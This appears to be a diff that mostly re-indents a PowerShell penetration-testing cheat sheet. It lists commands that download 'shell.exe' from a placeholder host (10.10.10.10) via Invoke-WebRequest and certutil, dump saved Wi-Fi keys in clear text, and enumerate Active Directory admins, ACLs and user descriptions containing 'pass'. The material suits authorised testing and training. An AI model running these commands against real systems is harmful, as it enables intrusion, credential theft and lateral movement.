@@ -1,39 +1,57 @@
-#Powershell handy commands
-#List of useful Powershell commands
+       
+       
+       
+      Powershell handy commands
+
+      List of useful Powershell commands
 
 
 
-#System enumeration
+     #System enumeration
 
 -systeminfo
 -Get-WmiObject Win32_ComputerSystem
 -echo "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
 
 
-# List Security patches
+
+
+      # List Security patches
 
 -Get-Hotfix -description "Security update"
 -wmic qfe get HotfixID,ServicePackInEffect,InstallDate,InstalledBy,InstalledOn
 
-# Environment Variables
+      # Environment Variables
 -Get-ChildItem Env: | ft Key,Value
 
-#(over cmd.exe)
+
+      #(over cmd.exe)
 -set
 
-#HTTP download (wget like)
+
+
+      #HTTP download (wget like)
+      
 -Invoke-WebRequest "http://10.10.10.10/shell.exe" -OutFile "shell.exe" 
 
-# Cmd compatible
+
+
+      # Cmd compatible
 -certutil -urlcache -f http://10.10.10.10/shell.exe shell.exe
 
-#WLAN enumeration
+
+
+
+      #WLAN enumeration
 
 -netsh wlan show profiles
 -netsh wlan show profile name="PROFILE-NAME" key=clear
 
 
-#Active Directory enumeration
+
+
+
+    #Active Directory enumeration
 
 
 #Domain enumeration
@@ -69,7 +87,11 @@ Get-UserProperty –Properties pwdlastset
 # Description of User object
 Find-UserField -SearchField Description –SearchTerm “pass”
 
-Computer enumeration
+
+
+
+
+        Computer enumeration
 
 # List Computers of the Domain
 Get-NetComputer
@@ -80,7 +102,14 @@ Get-NetComputer -Ping
 # List Windows 7 Ultimate Computers
 Get-NetComputer –OperatingSystem "Windows 7 Ultimate"
 
-Admin groups and account enumeration
+
+
+
+
+
+
+      Admin groups and account enumeration
+
 
 # List Domain Admin members
 Get-NetGroupMember -GroupName "Domain Admins"
@@ -94,7 +123,11 @@ Get-NetLocalGroup –ComputerName PCNAME-001
 # Get groups of user [need Administrative rights]
 Get-NetGroup –UserName "username"
 
-ACL enumeration
+
+
+
+      ACL enumeration
+
 
 # User ACL
 Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs
